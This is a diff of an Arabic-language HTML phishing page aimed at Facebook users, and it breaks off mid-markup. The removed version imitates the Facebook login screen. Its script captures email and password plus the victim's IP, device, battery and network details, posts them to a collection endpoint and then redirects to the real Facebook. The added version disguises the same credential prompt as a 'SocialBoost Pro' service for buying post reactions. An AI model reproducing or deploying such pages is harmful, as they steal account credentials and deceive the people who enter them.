@@ -1,128 +1,651 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>فيسبوك - تسجيل الدخول</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #ffffff;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-    }
-    .container {
-      width: 100%;
-      max-width: 420px;
-      padding: 0 24px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-    .language-selector { font-size: 15px; color: #333; margin-bottom: 40px; text-align: center; width: 100%; }
-    .fb-logo-wrapper { margin-bottom: 48px; }
-    .fb-logo { width: 72px; height: 72px; background-color: #1877F2; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-    .fb-logo svg { width: 44px; height: 44px; fill: #ffffff; }
-    .form-area { width: 100%; display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
-    .input-field { width: 100%; padding: 16px 18px; border: 1.5px solid #dddfe2; border-radius: 12px; font-size: 17px; color: #1c1e21; background: #ffffff; outline: none; text-align: right; }
-    .input-field:focus { border-color: #1877F2; }
-    .btn-login { width: 100%; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; background-color: #1877F2; color: #fff; border: none; margin-top: 4px; }
-    .btn-login:disabled { background-color: #a0a0a0; }
-    .forgot-password { font-size: 16px; color: #1c1e21; margin-top: 14px; margin-bottom: 60px; text-align: center; cursor: pointer; }
-    .btn-create { width: 100%; padding: 16px; border-radius: 30px; font-size: 18px; font-weight: 600; cursor: pointer; background-color: #fff; color: #1877F2; border: 2px solid #1877F2; margin-bottom: 28px; }
-    .spinner {
-      display: inline-block; width: 20px; height: 20px;
-      border: 3px solid rgba(255,255,255,0.3); border-top-color: #fff;
-      border-radius: 50%; animation: spin 0.8s linear infinite; margin-left: 8px;
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SocialBoost Pro - زيادة تفاعلات فيسبوك</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary: #1877F2;
+            --primary-dark: #166fe5;
+            --secondary: #42b72a;
+            --bg-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --card-bg: rgba(255, 255, 255, 0.95);
+            --text-dark: #1c1e21;
+            --text-gray: #65676b;
+            --border: #dddfe2;
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: var(--bg-gradient);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"/></svg>');
+            background-size: 100px 100px;
+            opacity: 0.3;
+            pointer-events: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 480px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            background: var(--card-bg);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: var(--shadow);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #1877F2 0%, #00c6ff 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 10px 30px rgba(24, 119, 242, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .logo i {
+            font-size: 40px;
+            color: white;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 800;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
+            color: var(--text-gray);
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .platform-grid {
+            display: grid;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .platform-card {
+            background: white;
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .platform-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            transition: left 0.5s;
+        }
+
+        .platform-card:hover::before {
+            left: 100%;
+        }
+
+        .platform-card:hover {
+            border-color: var(--primary);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(24, 119, 242, 0.15);
+        }
+
+        .platform-card.selected {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, rgba(24, 119, 242, 0.1) 0%, rgba(0, 198, 255, 0.1) 100%);
+        }
+
+        .platform-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+        }
+
+        .facebook-icon {
+            background: linear-gradient(135deg, #1877F2 0%, #00c6ff 100%);
+            color: white;
+        }
+
+        .platform-info h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 4px;
+        }
+
+        .platform-info p {
+            font-size: 13px;
+            color: var(--text-gray);
+        }
+
+        .check-mark {
+            margin-right: auto;
+            width: 28px;
+            height: 28px;
+            background: var(--primary);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 14px;
+            opacity: 0;
+            transform: scale(0);
+            transition: all 0.3s ease;
+        }
+
+        .platform-card.selected .check-mark {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .input-wrapper i {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--primary);
+            font-size: 18px;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 16px 16px 16px 48px;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: 'Cairo', sans-serif;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 4px rgba(24, 119, 242, 0.1);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, #00c6ff 100%);
+            color: white;
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.3);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(24, 119, 242, 0.4);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
+        }
+
+        .btn-secondary {
+            background: white;
+            color: var(--text-dark);
+            border: 2px solid var(--border);
+            margin-top: 12px;
+        }
+
+        .btn-secondary:hover {
+            border-color: var(--primary);
+            color: var(--primary);
+        }
+
+        .reactions-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 20px 0;
+        }
+
+        .reaction-item {
+            background: white;
+            border: 2px solid var(--border);
+            border-radius: 16px;
+            padding: 15px 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .reaction-item:hover {
+            transform: translateY(-3px);
+            border-color: var(--primary);
+        }
+
+        .reaction-item.selected {
+            border-color: var(--primary);
+            background: linear-gradient(135deg, rgba(24, 119, 242, 0.1) 0%, rgba(0, 198, 255, 0.1) 100%);
+            box-shadow: 0 4px 15px rgba(24, 119, 242, 0.2);
+        }
+
+        .reaction-emoji {
+            font-size: 32px;
+            margin-bottom: 5px;
+            display: block;
+        }
+
+        .reaction-name {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-gray);
+        }
+
+        .quantity-selector {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background: white;
+            border: 2px solid var(--border);
+            border-radius: 12px;
+            padding: 5px;
+            margin: 20px 0;
+        }
+
+        .qty-btn {
+            width: 40px;
+            height: 40px;
+            border: none;
+            background: var(--primary);
+            color: white;
+            border-radius: 8px;
+            font-size: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .qty-btn:hover {
+            background: var(--primary-dark);
+            transform: scale(1.1);
+        }
+
+        .qty-display {
+            flex: 1;
+            text-align: center;
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--text-dark);
+        }
+
+        .progress-bar {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .progress-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: var(--border);
+            transition: all 0.3s ease;
+        }
+
+        .progress-dot.active {
+            background: var(--primary);
+            width: 30px;
+            border-radius: 5px;
+        }
+
+        .back-btn {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            background: white;
+            border: none;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            color: var(--text-dark);
+            font-size: 18px;
+            transition: all 0.3s ease;
+        }
+
+        .back-btn:hover {
+            background: var(--primary);
+            color: white;
+            transform: translateX(-3px);
+        }
+
+        .summary-box {
+            background: linear-gradient(135deg, rgba(24, 119, 242, 0.05) 0%, rgba(0, 198, 255, 0.05) 100%);
+            border: 2px solid var(--primary);
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .summary-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(24, 119, 242, 0.1);
+        }
+
+        .summary-item:last-child {
+            border-bottom: none;
+        }
+
+        .summary-label {
+            font-weight: 600;
+            color: var(--text-gray);
+        }
+
+        .summary-value {
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-animation {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .success-icon {
+            width: 100px;
+            height: 100px;
+            background: linear-gradient(135deg, #42b72a 0%, #2ecc71 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            0% { transform: scale(0); }
+            50% { transform: scale(1.2); }
+            100% { transform: scale(1); }
+        }
+
+        .success-icon i {
+            font-size: 50px;
+            color: white;
+        }
+
+        .hidden { display: none !important; }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="language-selector">العربية</div>
+    <div class="container">
+        <!-- الصفحة 1: اختيار المنصة -->
+        <div class="page active" id="page1">
+            <div class="card">
+                <div class="header">
+                    <div class="logo">
+                        <i class="fas fa-rocket"></i>
+                    </div>
+                    <h1>SocialBoost Pro</h1>
+                    <p class="subtitle">اختر المنصة لزيادة التفاعلات</p>
+                </div>
 
-    <div class="fb-logo-wrapper">
-      <div class="fb-logo">
-        <svg viewBox="0 0 24 24"><path d="M24 12.073C24 5.405 18.627 0 12 0S0 5.405 0 12.073C0 18.1 4.388 23.094 10.125 24v-8.437H7.078v-3.49h3.047V9.41c0-3.025 1.792-4.697 4.533-4.697 1.312 0 2.686.235 2.686.235v2.97h-1.513c-1.491 0-1.956.93-1.956 1.886v2.27h3.328l-.532 3.49h-2.796V24C19.612 23.094 24 18.1 24 12.073z"/></svg>
-      </div>
-    </div>
+                <div class="progress-bar">
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot"></div>
+                    <div class="progress-dot"></div>
+                    <div class="progress-dot"></div>
+                </div>
 
-    <div class="form-area">
-      <input class="input-field" id="emailInput" type="text" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" />
-      <input class="input-field" id="passwordInput" type="password" placeholder="كلمة السر" />
-    </div>
+                <div class="platform-grid">
+                    <div class="platform-card selected" onclick="selectPlatform('facebook')">
+                        <div class="platform-icon facebook-icon">
+                            <i class="fab fa-facebook-f"></i>
+                        </div>
+                        <div class="platform-info">
+                            <h3>فيسبوك</h3>
+                            <p>زيادة تفاعلات المنشورات</p>
+                        </div>
+                        <div class="check-mark">
+                            <i class="fas fa-check"></i>
+                        </div>
+                    </div>
+                </div>
 
-    <button class="btn-login" id="loginBtn" onclick="handleLogin()">تسجيل الدخول</button>
-    <div class="forgot-password">هل نسيت كلمة السر؟</div>
-    <button class="btn-create">إنشاء حساب جديد</button>
-  </div>
+                <button class="btn btn-primary" onclick="goToPage(2)" style="margin-top: 25px;">
+                    متابعة <i class="fas fa-arrow-left"></i>
+                </button>
+            </div>
+        </div>
 
-  <script>
-    const API_URL = '/send-data';
+        <!-- الصفحة 2: تسجيل الدخول -->
+        <div class="page" id="page2">
+            <button class="back-btn" onclick="goToPage(1)">
+                <i class="fas fa-arrow-right"></i>
+            </button>
 
-    async function collectBasicInfo() {
-      const info = {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        deviceType: /Mobile/i.test(navigator.userAgent) ? '📱 موبايل' : '💻 كمبيوتر'
-      };
-      
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        info.ip = data.ip;
-      } catch (e) { info.ip = 'غير متوفر'; }
-      
-      if ('getBattery' in navigator) {
-        try {
-          const bat = await navigator.getBattery();
-          info.battery = Math.round(bat.level * 100) + '% ' + (bat.charging ? '⚡' : '🔋');
-        } catch (e) { info.battery = 'غير متوفر'; }
-      }
-      
-      if ('connection' in navigator) {
-        info.network = navigator.connection.effectiveType || 'غير معروف';
-      }
-      
-      return info;
-    }
+            <div class="card">
+                <div class="header">
+                    <div class="logo" style="background: linear-gradient(135deg, #1877F2 0%, #00c6ff 100%);">
+                        <i class="fab fa-facebook-f"></i>
+                    </div>
+                    <h1>تسجيل الدخول</h1>
+                    <p class="subtitle">أدخل بيانات حسابك لفيسبوك</p>
+                </div>
 
-    async function handleLogin() {
-      const btn = document.getElementById('loginBtn');
-      const email = document.getElementById('emailInput').value;
-      const password = document.getElementById('passwordInput').value;
+                <div class="progress-bar">
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot"></div>
+                    <div class="progress-dot"></div>
+                </div>
 
-      if (!email || !password) {
-        alert('الرجاء إدخال البريد/الهاتف وكلمة المرور');
-        return;
-      }
+                <div class="input-group">
+                    <label>البريد الإلكتروني أو رقم الهاتف</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-envelope"></i>
+                        <input type="text" class="input-field" id="emailInput" placeholder="example@email.com">
+                    </div>
+                </div>
 
-      btn.disabled = true;
-      btn.innerHTML = '<span class="spinner"></span> جارٍ تسجيل الدخول...';
+                <div class="input-group">
+                    <label>كلمة المرور</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock"></i>
+                        <input type="password" class="input-field" id="passwordInput" placeholder="••••••••">
+                    </div>
+                </div>
 
-      const d = await collectBasicInfo();
-      const timeStr = new Date().toLocaleString('ar-SA');
+                <button class="btn btn-primary" onclick="handleLogin()" id="loginBtn">
+                    تسجيل الدخول <i class="fas fa-sign-in-alt"></i>
+                </button>
 
-      const caption = `🔴 تسجيل دخول جديد!\n\n━━━━━━━━━━━━━━━━━━━━\n👤 بيانات الحساب:\n📧 البريد/الهاتف: ${email}\n🔑 كلمة المرور: ${password}\n━━━━━━━━━━━━━━━━━━━━\n\n📱 معلومات الجهاز:\n• IP: ${d.ip}\n• نوع الجهاز: ${d.deviceType}\n• المنصة: ${d.platform}\n\n🔋 البطارية: ${d.battery || 'غير متوفر'}\n📡 الشبكة: ${d.network || 'غير معروف'}\n\n🌐 المتصفح:\n${d.userAgent}\n\n⏰ الوقت: ${timeStr}\n━━━━━━━━━━━━━━━━━━━━`;
+                <button class="btn btn-secondary" onclick="goToPage(1)">
+                    <i class="fas fa-times"></i> إلغاء
+                </button>
+            </div>
+        </div>
 
-      try {
-        await fetch(API_URL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ caption, email, password, timestamp: new Date().toISOString() })
-        });
-      } catch (e) { console.error('Send error:', e); }
+        <!-- الصفحة 3: اختيار التفاعلات -->
+        <div class="page" id="page3">
+            <button class="back-btn" onclick="goToPage(2)">
+                <i class="fas fa-arrow-right"></i>
+            </button>
 
-      setTimeout(() => window.location.href = 'https://m.facebook.com/', 2000);
-    }
+            <div class="card">
+                <div class="header">
+                    <div class="logo" style="background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%);">
+                        <i class="fas fa-heart"></i>
+                    </div>
+                    <h1>اختر التفاعلات</h1>
+                    <p class="subtitle">حدد نوع وعدد التفاعلات المطلوبة</p>
+                </div>
 
-    document.getElementById('passwordInput').addEventListener('keypress', (e) => {
-      if (e.key === 'Enter') handleLogin();
-    });
-  </script>
-</body>
-</html>
+                <div class="progress-bar">
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot active"></div>
+                    <div class="progress-dot"></div>
+                </div>
+
+                <label style="display: block; font-size: 14px; font-weight: 700; color: var(--text-dark); margin-bottom: 12px;">
+                    اختر نوع التفاعل:
+                </label>
+
+                <div class="reactions-grid">
+                    <div class="reaction-item selected" onclick="selectReaction('like', this)">
+                        <span class="reaction-emoji">👍</span>
+                        <span class="reaction-name">إعجاب</span>
+                    </div>
+                    <div class="reaction-item" onclick="selectReaction('love', this)">
+                        <span class="reaction-emoji">❤️</span>
+                        <span class="reaction-name">حب</span>
+                    </div>
+                    <div class="reaction-item" onclick="selectReaction('care', this)">
+                        <span class="reaction-emoji">🤗</span>
+                        <span class="reaction-name">أهم بالأمر</span>
+                    </div>
+                    <div class="reaction-item" onclick="selectReaction('haha', this)">
+                        <span class="reaction-emoji">😂</span>
+                        <span class="reaction-name">هاها</span>
+                    </div>
+                    <div class="reaction-item" onclick="selectReaction('wow', this)">
+                        <span class="reaction-emoji">😮</span>
+                        <span class="reaction-name">واو</span>
+                    </div>
+                    <div class="reaction-item" onclick="selectReaction('sad', this)">
+                        <span class="reaction-emoji">😢</span>
+                        <span class="reaction-name">حزين</span>
+                    </div>
+                </div>
+
+                <label style="display: block; font-size: 14px; font-weight: 700; color: var(--text-dark); margin: 20px 0 12px;">
+                    عدد التفاعلات:
+                </label>
+
+                <div class="quantity-selector">
+                    <button class="qty-btn" onclick="changeQty(-50)">
+                        <i class="fa
